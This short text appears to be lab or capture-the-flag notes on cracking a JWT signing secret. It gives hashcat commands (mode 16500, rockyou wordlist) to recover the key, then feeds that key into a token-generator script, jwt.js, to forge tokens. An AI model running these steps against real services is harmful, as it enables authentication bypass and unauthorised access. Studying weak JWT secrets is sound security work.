Command:
hashcat-6.2.6/hashcat.bin -m 16500 -a 0 jwt_token.txt rockyou.txt --force

To show again the secret key that was found:
hashcat-6.2.6/hashcat.bin -m 16500 -a 0 jwt_token.txt rockyou.txt --force --show

The with the secret key we go and replace it in the token generator script (jwt.js) and run:
node jwt.js
